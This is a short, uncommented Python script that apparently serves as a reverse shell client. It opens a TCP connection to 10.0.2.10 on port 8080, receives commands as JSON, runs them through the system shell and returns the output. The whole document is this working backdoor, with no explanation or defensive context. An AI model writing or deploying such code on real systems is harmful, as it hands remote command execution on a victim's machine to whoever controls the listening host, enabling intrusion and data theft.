import json
import socket
import subprocess


class MySocket():
    def __init__(self, ip, port):
        self.myConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.myConnection.connect((ip, port))

    def commandExecution(self, command):
        return subprocess.check_output(command, shell=True)

    def jsonSend(self, data):
        jsonData = json.dumps(data)
        self.myConnection.send(jsonData)

    def jsonReceive(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.myConnection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    def startConnection(self):
        while True:
            command = self.jsonReceive()
            if command[0] == "exit":
                self.myConnection.close()
                exit()
            commandOutput = self.commandExecution(command)
            self.jsonSend(commandOutput)
        self.myConnection.close()


mySocketObj = MySocket("10.0.2.10", 8080)
mySocketObj.startConnection()
